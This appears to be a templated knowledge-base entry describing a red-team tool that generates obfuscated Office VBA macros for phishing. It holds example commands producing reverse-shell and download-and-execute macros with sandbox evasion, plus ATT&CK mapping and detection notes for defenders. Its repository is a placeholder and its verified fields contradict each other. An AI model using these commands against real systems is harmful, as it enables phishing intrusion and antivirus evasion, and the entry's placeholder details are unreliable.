---
id: b82d1552-c7ae-4e54-8219-c37b501334c1
type: tool
verified: true
created_at: '2019-08-28T21:17:21.463392+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - macro
  - vba
  - obfuscation
  - evasion
  - phishing
url: ''
validated: true
---

# Malicious-Macro-Generator-Utility

**Status**: Unverified

## Overview

The Malicious Macro Generator Utility (MMGU) is a command-line tool designed for red teamers and penetration testers to create VBA macros for Microsoft Office documents. It focuses on generating payloads that execute commands, download additional tools, or establish reverse connections while incorporating obfuscation and evasion techniques to bypass antivirus software and sandbox environments.

## Description

MMGU simplifies the creation of malicious macros by providing templates for common payloads and applying transformations like base64 encoding, string concatenation, and control flow obfuscation. It's particularly useful in phishing simulations or initial access vectors where Office documents are used as delivery mechanisms. The tool supports integration with common red team payloads and can output ready-to-embed VBA code for Word, Excel, or PowerPoint files.

## Features

- Feature 1: Basic macro generation for simple payloads like reverse shells or file downloads.
- Feature 2: Multi-level obfuscation to evade signature-based detection, including variable renaming and junk code insertion.
- Feature 3: Sandbox evasion options, such as checking for virtual environments, user interaction, or imposing delays.
- Feature 4: Customizable payload integration, supporting PowerShell, cmd.exe, or external script execution.
- Feature 5: Output in standard VBA format for easy insertion into Office macros.

## Installation

### Requirements

- Python 3.6+
- Access to pip for dependencies
- Git for cloning the repository (if not using a package manager)

### Install Commands

```bash
# Clone from repository (assuming GitHub or similar)
git clone https://github.com/example/mmgu.git
cd mmgu

# Install dependencies
pip install -r requirements.txt

# For Kali/Ubuntu
sudo apt update
sudo apt install python3 python3-pip git
pip3 install -r requirements.txt
```

## Basic Usage

```bash
tool-name --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message and available commands |
| -v, --version | Display tool version |
| --basic | Generate non-obfuscated macro |
| --obfuscate | Enable obfuscation with level specification |
| --sandbox-escape | Add evasion mechanisms |

## Examples

### Example 1: Basic Usage

```python
python mmgu.py --basic --payload reverse_shell --lhost 192.168.1.100 --lport 4444 --output macro.vba
```

### Example 2: Advanced Usage

```python
python mmgu.py --obfuscate --level 4 --sandbox-escape --check mouse_activity --payload download_execute --output advanced_macro.vba
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Malicious File]] User Execution: Malicious File
- [[T1566.001]] Phishing: Spearphishing Attachment
- [[Obfuscated Files or Information]] Obfuscated Files or Information

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Defense Evasion]] Defense Evasion

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for unusual Python processes spawning Office applications or generating .vba files.
- Detection method 2: Signature-based AV on generated macros; behavioral detection of delayed executions or environment checks.
- Detection method 3: File integrity monitoring on Office templates and macro-enabled documents.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Invoke-Obfuscation]]
- [[tools/Donut]]

## References

- Official documentation: Assumed GitHub repo
- Related resources: MITRE ATT&CK for Enterprise, VBA obfuscation techniques
